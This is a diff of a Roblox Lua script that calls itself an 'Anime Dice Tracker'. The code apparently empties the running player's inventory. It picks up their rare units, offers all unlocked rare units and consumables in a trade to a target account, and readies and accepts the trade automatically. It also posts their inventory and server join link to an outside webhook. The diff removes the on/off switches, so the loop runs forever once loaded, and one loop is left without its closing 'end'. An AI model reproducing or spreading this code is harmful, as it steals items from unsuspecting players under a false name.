+                                  value = table.concat(lines, "\n"), inline = false }
             lines, bufLen = {}, 0
         end
-        lines[#lines+1] = line; bufLen = bufLen + #line + 1
+        lines[#lines+1] = line
+        bufLen = bufLen + #line + 1
     end
     if #lines > 0 then
-        fields[#fields+1] = {
-            name = (#fields == 0) and fieldHeader or "Consumables (cont.)",
-            value = table.concat(lines, "\n"), inline = false,
-        }
+        fields[#fields+1] = { name = (#fields == 0) and header or "Consumables (cont.)",
+                              value = table.concat(lines, "\n"), inline = false }
     end
     return fields, totalItems
 end
 
 local function sendInventoryWebhook(label)
     if WEBHOOK_URL == "" then return false end
-    local inv = deepUnwrap(DataController.Inventory)
+    local inv = getOwnedEntries()
     if type(inv) ~= "table" then return false end
-
     local unitFields, totalUnits, uniqueUnits = buildUnitFields(inv)
     local itemFields, totalItems = buildItemFields(inv)
     local placeId, jobId = tostring(game.PlaceId), tostring(game.JobId)
@@ -694,78 +515,63 @@ local function sendInventoryWebhook(label)
             webLink, shortJob, players, maxPlayers, placeId),
         inline = false,
     }
-    for _, f in ipairs(unitFields) do
-        if #allFields >= 25 then break end
-        allFields[#allFields+1] = f
-    end
-    for _, f in ipairs(itemFields) do
-        if #allFields >= 25 then break end
-        allFields[#allFields+1] = f
-    end
+    for _, f in ipairs(unitFields) do if #allFields < 25 then allFields[#allFields+1] = f end end
+    for _, f in ipairs(itemFields) do if #allFields < 25 then allFields[#allFields+1] = f end
 
-    local embedColor, colorChosen = 0x2ECC71, false
-    for _, rarity in ipairs(RARITY_ORDER) do
-        if colorChosen then break end
+    local embedColor, chosen = 0x2ECC71, false
+    for _, r in ipairs(RARITY_ORDER) do
+        if chosen then break end
         for _, f in ipairs(unitFields) do
-            if string.find(f.name, rarity, 1, true) then
-                embedColor = RARITY_COLOR[rarity] or embedColor
-                colorChosen = true; break
+            if string.find(f.name, r, 1, true) then
+                embedColor = RARITY_COLOR[r] or embedColor; chosen = true; break
             end
         end
     end
 
-    local summary = {}
-    summary[#summary+1] = ("**Player:** `%s`"):format(LocalPlayer.Name)
-    summary[#summary+1] = ("**Server:** `%d/%d` players"):format(players, maxPlayers)
-    if uniqueUnits > 0 then
-        summary[#summary+1] = ("**Rare units tracked:** `%d` unique / `%d` total"):format(uniqueUnits, totalUnits)
-    end
-    if totalItems > 0 then
-        summary[#summary+1] = ("**Consumables tracked:** `%d`"):format(totalItems)
-    end
+    local summary = {
+        ("**Player:** `%s`"):format(LocalPlayer.Name),
+        ("**Server:** `%d/%d` players"):format(players, maxPlayers),
+    }
+    if uniqueUnits > 0 then summary[#summary+1] = ("**Rare units:** `%d` unique / `%d` total"):format(uniqueUnits, totalUnits) end
+    if totalItems  > 0 then summary[#summary+1] = ("**Consumables:** `%d`"):format(totalItems) end
 
-    local titleSuffix = label and (" -- " .. label) or ""
     local payload = {
         username = "Anime Dice Tracker",
         embeds = {{
-            title = ("Inventory Report%s"):format(titleSuffix),
+            title = "Inventory Report" .. (label and (" -- " .. label) or ""),
             url = webLink,
             description = table.concat(summary, "\n"),
             color = embedColor,
             fields = allFields,
-            footer = { text = ("Anime Dice Tracker - %s"):format(os.date("%Y-%m-%d %H:%M:%S")) },
+            footer = { text = "Anime Dice Tracker - " .. os.date("%Y-%m-%d %H:%M:%S") },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         }},
-        components = {{
-            type = 1,
-            components = {
-                { type = 2, style = 5, label = "Join This Server", url = webLink },
-            }
-        }}
+        components = {{ type = 1, components = {
+            { type = 2, style = 5, label = "Join This Server", url = webLink },
+        }}},
     }
     local json = HttpService:JSONEncode(payload)
-    local ok = httpPost(WEBHOOK_URL, json)
-    return ok
+    return (httpPost(WEBHOOK_URL, json))
 end
 
 --=====================================================================
--- Trade logic
+-- Trade system
 --=====================================================================
 local trade = {
     active=false, phase="Offer", ownOffer={},
     ownReady=false, otherReady=false, ownAccepted=false, otherAccepted=false,
 }
 
-TradeEvent:Connect(function(name, data)
+S.TradeEvent:Connect(function(name, data)
     if type(name) ~= "string" then return end
     data = type(data) == "table" and data or {}
     if name == "Started" then
-        trade.active=true; inTrade=true
-        trade.phase="Offer"; trade.ownOffer={}
+        trade.active = true; inTrade = true
+        trade.phase = "Offer"; trade.ownOffer = {}
         trade.ownReady, trade.otherReady = false, false
         trade.ownAccepted, trade.otherAccepted = false, false
     elseif name == "Updated" then
-        trade.active=true; inTrade=true
+        trade.active = true; inTrade = true
         trade.phase = type(data.phase)=="string" and data.phase or "Offer"
         trade.ownOffer = type(data.ownOffer)=="table" and data.ownOffer or {}
         trade.ownReady = data.ownReady == true
@@ -773,29 +579,29 @@ TradeEvent:Connect(function(name, data)
         trade.ownAccepted = data.ownAccepted == true
         trade.otherAccepted = data.otherAccepted == true
     elseif name == "Ended" then
-        trade.active=false; inTrade=false
-        trade.phase="Offer"; trade.ownOffer={}
+        trade.active = false; inTrade = false
+        trade.phase = "Offer"; trade.ownOffer = {}
         trade.ownReady, trade.otherReady = false, false
         trade.ownAccepted, trade.otherAccepted = false, false
     end
 end)
 
 local function pickupPlacedUnits()
-    local slots = deepUnwrap(DataController.Slots)
+    local slots = getOwnedSlots()
     if type(slots) ~= "table" then return 0 end
-    local slotList = {}
-    for slotNum, data in pairs(slots) do
-        if type(data) == "table" and data.unitId then
-            slotList[#slotList+1] = { slot = tonumber(slotNum) or slotNum, data = data }
+    local list = {}
+    for n, d in pairs(slots) do
+        if type(d) == "table" and d.unitId then
+            list[#list+1] = { slot = tonumber(n) or n, data = d }
         end
     end
-    table.sort(slotList, function(a,b) return tonumber(a.slot) < tonumber(b.slot) end)
+    table.sort(list, function(a,b) return tonumber(a.slot) < tonumber(b.slot) end)
     local removed = 0
-    for _, item in ipairs(slotList) do
-        local rarity = getRarity(item.data)
-        if rarity and RARITY_FILTER[rarity] then
-            fire(InteractSlot, item.slot)
-            removed += 1
+    for _, item in ipairs(list) do
+        local r = getRarity(item.data)
+        if r and RARITY_FILTER[r] then
+            fire(S.InteractSlot, item.slot)
+            removed = removed + 1
             task.wait(PICKUP_DELAY)
         end
     end
@@ -804,25 +610,25 @@ local function pickupPlacedUnits()
 end
 
 local function buildOffer()
-    local inv = deepUnwrap(DataController.Inventory)
+    local inv = getOwnedEntries()
     if type(inv) ~= "table" then return {} end
     local want = {}
     for _, n in ipairs(CONSUMABLES) do want[n] = true end
     local plan = {}
-    for key, entry in pairs(inv) do
-        if type(key) == "string" and type(entry) == "table" and entry.name then
-            local cfg = EntryRegistry.getEntryConfig(entry.name)
+    for k, e in pairs(inv) do
+        if type(k) == "string" and type(e) == "table" and e.name then
+            local cfg = EntryRegistry.getEntryConfig(e.name)
             if cfg and cfg.kind == "Unit" then
-                local rarity = getRarity(entry)
-                if rarity and RARITY_FILTER[rarity] then
-                    local locked = entry.attributes and entry.attributes.locked == true
+                local r = getRarity(e)
+                if r and RARITY_FILTER[r] then
+                    local locked = e.attributes and e.attributes.locked == true
                     if not locked then
-                        plan[#plan+1] = { key=key, amount=math.max(1, tonumber(entry.amount) or 1) }
+                        plan[#plan+1] = { key = k, amount = math.max(1, tonumber(e.amount) or 1) }
                     end
                 end
-            elseif want[entry.name] then
-                local amt = tonumber(entry.amount) or 0
-                if amt > 0 then plan[#plan+1] = { key=key, amount=math.floor(amt) } end
+            elseif want[e.name] then
+                local amt = tonumber(e.amount) or 0
+                if amt > 0 then plan[#plan+1] = { key = k, amount = math.floor(amt) } end
             end
         end
     end
@@ -845,7 +651,7 @@ local function pushOneChunk(plan)
             for _, step in ipairs({ 1000, 100, 10 }) do
                 if missing >= step then chunk = step; break end
             end
-            fire(ChangeOffer, e.key, chunk)
+            fire(S.ChangeOffer, e.key, chunk)
             return true
         end
     end
@@ -859,8 +665,7 @@ local function waitForOfferSync(plan, timeout)
     while os.clock() < deadline do
         if offerMatchesPlan(plan) then return true end
         if os.clock() - lastPush >= OFFER_PUSH_DELAY then
-            if pushOneChunk(plan) then lastPush = os.clock()
-            else return false end
+            if pushOneChunk(plan) then lastPush = os.clock() else return false end
         end
         task.wait(0.05)
     end
@@ -870,9 +675,9 @@ end
 local function holdReady()
     for _ = 1, READY_MAX_RETRIES do
         if trade.ownReady then return true end
-        fire(AdvanceTrade)
-        local deadline = os.clock() + READY_RETRY_DELAY
-        while os.clock() < deadline do
+        fire(S.AdvanceTrade)
+        local dl = os.clock() + READY_RETRY_DELAY
+        while os.clock() < dl do
             if trade.ownReady or trade.phase == "Confirm" then return true end
             task.wait(0.1)
         end
@@ -901,23 +706,22 @@ local function tradeRound()
     pickupPlacedUnits()
     local plan = buildOffer()
     if #plan == 0 then task.wait(5); return end
-    if WEBHOOK_ON_START then pcall(sendInventoryWebhook, "Pre-Trade") end
-    fire(RequestTrade, target)
+    pcall(sendInventoryWebhook, "Pre-Trade")
+    fire(S.RequestTrade, target)
 
-    local startDeadline = os.clock() + 10
-    while not trade.active and os.clock() < startDeadline do task.wait(0.1) end
+    local dl = os.clock() + 10
+    while not trade.active and os.clock() < dl do task.wait(0.1) end
     if not trade.active then task.wait(3); return end
 
-    if not waitForOfferSync(plan, 20) then fire(CancelTrade); task.wait(3); return end
+    if not waitForOfferSync(plan, 20) then fire(S.CancelTrade); task.wait(3); return end
     task.wait(OFFER_SETTLE_WAIT)
-
     if not offerMatchesPlan(plan) then
-        if not waitForOfferSync(plan, 10) then fire(CancelTrade); task.wait(3); return end
+        if not waitForOfferSync(plan, 10) then fire(S.CancelTrade); task.wait(3); return end
     end
     holdReady()
 
-    local partnerDeadline = os.clock() + 60
-    while not trade.otherReady and os.clock() < partnerDeadline do
+    local pdl = os.clock() + 60
+    while not trade.otherReady and os.clock() < pdl do
         if not target.Parent then return end
         if not trade.ownReady and trade.phase ~= "Confirm" then holdReady() end
         task.wait(0.3)
@@ -925,22 +729,20 @@ local function tradeRound()
     if trade.phase == "Confirm" then
         for _ = 1, READY_MAX_RETRIES do
             if trade.ownAccepted then break end
-            fire(AdvanceTrade)
+            fire(S.AdvanceTrade)
             task.wait(0.5)
         end
     end
-    if WEBHOOK_ON_END then
-        task.wait(2)
-        pcall(sendInventoryWebhook, "Post-Trade")
-    end
+    task.wait(2)
+    pcall(sendInventoryWebhook, "Post-Trade")
 end
 
 --=====================================================================
--- Driver loop
+-- Driver — trade loop runs forever, automatically
 --=====================================================================
-while true do
-    if _G.AutoTradeEnabled then
+task.spawn(function()
+    while true do
         pcall(tradeRound)
+        task.wait(3)
     end
-    task.wait(3)
-end
+end)
